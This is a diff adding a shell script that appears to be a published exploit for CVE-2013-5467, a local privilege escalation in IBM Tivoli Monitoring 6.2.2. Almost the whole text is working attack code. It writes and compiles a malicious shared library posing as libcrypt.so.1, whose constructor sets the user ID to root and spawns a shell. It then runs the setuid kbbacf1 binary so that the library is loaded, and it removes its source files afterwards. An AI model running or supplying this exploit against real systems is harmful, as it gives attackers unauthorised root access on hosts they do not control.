@@ -1,0 +1,40 @@
+#!/bin/sh
+# Title: IBM Tivoli Monitoring V6.2.2 kbbacf1 privilege escalation exploit
+# CVE: CVE-2013-5467
+# Vendor Homepage: http://www-03.ibm.com/software/products/pl/tivomoni
+# Author: Robert Jaroszuk
+# Tested on: RedHat 5, Centos 5
+# Vulnerable version: IBM Tivoli Monitoring V6.2.2 (other versions not tested)
+#
+echo "[+] Tivoli pwner kbbacf1 privilege escalation exploit by Robert Jaroszuk"
+echo "[+] Preparing the code..."
+cat > kbbacf1-pwn.c << DONE
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <stdlib.h>
+#include <dlfcn.h>
+
+void __cxa_finalize (void *d) {
+    return;
+}
+
+void __attribute__((constructor)) init() {
+    setresuid(geteuid(), geteuid(), geteuid());
+    execl("/bin/sh", (char *)NULL, (char *)NULL);
+}
+DONE
+
+cat > version << DONE
+GLIBC_2.2.5 { };
+GLIBC_2.3 { };
+GLIBC_2.3.2 { };
+GLIBC_PRIVATE { };
+DONE
+echo "[+] Preparing the code... part2"
+/usr/bin/gcc -Wall -fPIC -shared -static-libgcc -Wl,--version-script=version -o libcrypt.so.1 kbbacf1-pwn.c
+
+echo "[+] Cleaning up..."
+/bin/rm -f kbbacf1-pwn.c version
+
+echo "[+] Exploiting."
+/opt/IBM/ITM/tmaitm6/lx8266/bin/kbbacf1
